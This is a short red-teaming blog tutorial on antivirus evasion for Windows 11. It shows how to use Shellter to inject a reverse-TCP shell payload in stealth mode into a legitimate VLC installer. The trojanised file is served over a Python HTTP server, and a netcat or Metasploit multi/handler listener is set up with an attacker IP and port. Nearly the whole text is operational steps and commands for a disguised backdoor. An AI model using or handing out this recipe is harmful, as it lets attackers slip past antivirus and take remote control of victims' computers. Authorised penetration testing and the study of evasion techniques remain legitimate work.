---
title: "Anti-Virus Evasion"
date: 2024-04-25 22:56:24 +0800
categories: [AVEvasion]
tags: [RedTeaming]
---

# Antivirus Evasion on Windows 11

Using Shellter, I got a reverse shell on Windows 11. Below are the steps I followed:

## Steps:

1. Run Shellter using Wine:
   ```bash
   wine shellter.exe
   ```

2. After Shellter opens, choose: \
   ![Anti-Virus Evasion 01](assets/img/AV-Evasion/AV-Evasion-01.png)

   Write the path of the target executable program: \
   ![Anti-Virus Evasion 02](assets/img/AV-Evasion/AV-Evasion-02.png)
   ```bash
   /home/kali/Downloads/vlc32.exe
   ```

3. Choose `(Y)` for stealth mode: \
   ![Anti-Virus Evasion 03](assets/img/AV-Evasion/AV-Evasion-03.png)

4. Choose `(L)` for local injection: \
   ![Anti-Virus Evasion 04](assets/img/AV-Evasion/AV-Evasion-04.png)

5. Select `(5)` for `shell_reverse_tcp` payload: \
   ![Anti-Virus Evasion 05](assets/img/AV-Evasion/AV-Evasion-05.png)

6. Set `LHOST` to your attacker machine's IP address:
   ```bash
   LHOST 192.168.1.17
   ```
   ![Anti-Virus Evasion 06](assets/img/AV-Evasion/AV-Evasion-06.png)

7. Set `LPORT` to the port you will be listening on (e.g., `4444`):
   ```bash
   LPORT 4444
   ```
   ![Anti-Virus Evasion 07](assets/img/AV-Evasion/AV-Evasion-07.png)

8. Press Enter and wait ... for the process to finish

## Sending the File to the Target

To send the generated `.exe` file to the target, you can use a simple HTTP server on Kali Linux:

9. In the path of the generated executable file, open a terminal and start an HTTP server:
   ```bash
   python -m http.server 8888
   ```

## Opening a Listener on the Attacker Machine

You can open a listener in one of the following two ways:

### 1. Using Netcat:
```bash
nc -nlvp 4444
```

### 2. Using Metasploit:
```bash
msfconsole -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LPORT 4444; set LHOST 192.168.1.17"
```

When the Metasploit console opens, type `exploit` or `run` to start the handler:
```bash
msf6 exploit(multi/handler)> exploit
```

## Video Tutorial

Check out the following video for more details:

<!-- Click the image to watch the tutorial! -->
<!-- [![Anti-Virus Evasion Tutorial](https://img.youtube.com/vi/03mbGTtrVHI/0.jpg)](https://youtu.be/03mbGTtrVHI) -->

<iframe width="560" height="315" src="https://www.youtube.com/embed/03mbGTtrVHI" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>